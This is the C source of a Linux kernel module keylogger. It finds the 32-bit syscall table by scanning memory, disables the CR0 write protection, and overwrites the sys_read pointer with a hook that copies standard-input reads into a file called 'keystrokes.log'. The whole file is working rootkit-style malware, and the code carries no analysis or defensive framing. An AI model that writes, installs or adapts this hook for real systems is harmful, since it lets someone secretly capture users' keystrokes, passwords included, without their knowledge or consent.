#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#include "headers/kfile.h"

//addrs specific to 32-bit systems
#define START_MEM 0xc0000000
#define END_MEM 0xd0000000

//log file-related constants
#define LF_PATH  "keystrokes.log"  //filepath
#define LF_PERMS 0644  //file permissions (see chmod man for more info)
#define LF_FLAGS O_WRONLY|O_CREAT|O_APPEND  //straight macro

unsigned long *syscall_table;
asmlinkage long (*original_read)(unsigned int, char*, size_t);

struct file *logfile;

// our replacement sys_read
// We will probably have to do some work in filtering the incoming
// chars so we can get more than just ascii
asmlinkage long new_read(unsigned int fd, char *u_buf, size_t size) {

  //call the original sys_read
  long ret = original_read(fd, u_buf, size);

  //check if fd is stdin and if the read was successful
  if(!fd && ret > 0){

    //grab keystrokes (characters in input buffer)
    char *key = (char*)kmalloc(size*sizeof(char), GFP_KERNEL);
    if(!copy_from_user(key, u_buf,size)){
      kwrite(logfile, 0, key, sizeof(char));  //write keystrokes to log
    }
    kfree(key);
  }

  return ret;
}

static int init(void) {
  register unsigned long i;
  printk(KERN_ALERT "module initted\n");

  //find the syscall table address through a brute force search
  //this should be moved to a separate method at some point
  i = START_MEM;
  while(i < END_MEM){
    //we will compare the current address with that of sys_close
    unsigned long *current_address = (unsigned long *)i;
    if(current_address[__NR_close] == sys_close){
      printk(KERN_ALERT "sys call table address is %x\n",
	     (unsigned long)current_address);
      syscall_table = current_address;
      break;
    }
    i+= sizeof(void*);
  }

  //hijack sys_read (overwrite syscall table)
  write_cr0 (read_cr0 () & (~0x10000));  //disable write-protection
  original_read = (void *)syscall_table[__NR_read];  //store original sys_read
  syscall_table[__NR_read] = (long)new_read;  //overwrite sys_read pointer
  write_cr0 (read_cr0 () | 0x10000);     //reenable write-protection

  //open log file
  logfile = kopen(LF_PATH, LF_FLAGS, LF_PERMS);
  
  return 0;
}

static void exit(void) {

  //restore original sys_read
  write_cr0 (read_cr0 () & (~0x10000));  //disable write-protection
  syscall_table[__NR_read] = (long)original_read;  //overwrite sys_read pointer
  write_cr0 (read_cr0 () | 0x10000);     //reenable write-protection

  //close log file
  kclose(logfile);

  printk(KERN_ALERT "module exitted\n");
}

MODULE_LICENSE("GPL");
module_init(init);
module_exit(exit);
